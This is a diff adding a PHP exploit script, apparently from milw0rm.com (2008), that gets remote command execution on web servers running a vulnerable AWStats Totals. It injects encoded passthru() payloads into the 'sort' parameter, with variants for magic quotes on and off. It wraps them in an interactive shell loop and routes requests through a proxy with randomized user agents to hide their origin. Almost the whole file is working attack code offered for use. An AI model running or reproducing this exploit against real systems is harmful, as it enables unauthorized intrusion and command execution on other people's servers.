@@ -1,0 +1,69 @@
+<?php
+/* 
+ * Remote Execution Exploit for AWStats Totals vulnerability (Interactive Shell) Version 2
+ * 
+ * Updated 05/09/08: The exploit now works with magic quotes on or off
+ *  
+ * Author: Ricardo Almeida
+ * email:  ricardojba[at]aeiou[DoT]pt
+ *
+ * Greetz
+ * The hacker webzine authored by Ronald van den Heetkamp for his code
+ *
+ * Credits: Vulnerabilities reported by Emory University.
+ *          http://userwww.service.emory.edu/~ekenda2/EMORY-2008-01.txt 
+ * 
+ */ 
+
+function wrap($url){
+  $ua = array('Mozilla','Opera','Microsoft Internet Explorer','ia_archiver');
+  $op = array('Windows','Windows XP','Linux','Windows NT','Windows 2000','OSX');
+  $agent  = $ua[rand(0,3)].'/'.rand(1,8).'.'.rand(0,9).' ('.$op[rand(0,5)].' '.rand(1,7).'.'.rand(0,9).'; en-US;)';
+  # tor or other proxy
+  $tor = '172.20.1.15:8080';
+  $timeout = '300';
+  $ack = curl_init(); 
+  curl_setopt ($ack, CURLOPT_PROXY, $tor); 
+  curl_setopt ($ack, CURLOPT_URL, $url);
+  curl_setopt ($ack, CURLOPT_HEADER, 1);  
+  curl_setopt ($ack, CURLOPT_USERAGENT, $agent); 
+  curl_setopt ($ack, CURLOPT_RETURNTRANSFER, 1); 
+  curl_setopt ($ack, CURLOPT_FOLLOWLOCATION, 1);
+  curl_setopt ($ack, CURLOPT_TIMEOUT, $timeout);
+  $syn = curl_exec($ack);
+  $info = curl_getinfo($ack);
+  curl_close($ack);   
+
+  if($info['http_code'] == '200') {
+    return $syn;
+    die();
+  } else {
+    return "Fail! :".$info['http_code']."\r\n";
+  }
+}
+
+if ($argc != 3) {die("Usage: awtotalhack.php <host> <magic_quotes on or off>\nEx: awtotalhack.php host.tld on\n");}
+array_shift($argv);
+$host = $argv[0];
+$magic = $argv[1];
+
+# Start the interactive shell
+while(1){
+  fwrite(STDOUT, "[shell:~ # ");
+  if ($magic == "on") {
+    $c = str_split(trim(fgets(STDIN)));
+    if (implode($c) == "exit") {die();};
+    for($i=0;$i<count($c);$i++) {$c[$i] = "chr(".ord($c[$i]).")";}
+    $cmd = implode("%2e", $c);
+    $attackurl = "http://".$host."/"."awstatstotals.php?sort=%7b%24%7bpassthru%28".$cmd."%29%7d%7d%7b%24%7bexit%28%29%7d%7d";
+    echo wrap($attackurl);
+  } else if ($magic == "off") {
+    $cmd = preg_replace('/ /','%20',trim(fgets(STDIN)));
+    if ($cmd == "exit") {die();};
+    $attackurl = "http://".$host."/"."awstatstotals.php?sort=%22%5d%2epassthru%28%27".$cmd."%27%29%2eexit%28%29%2e%24a%5b%22";
+    echo wrap($attackurl);
+  }
+}
+?>
+
+# milw0rm.com [2008-09-05]
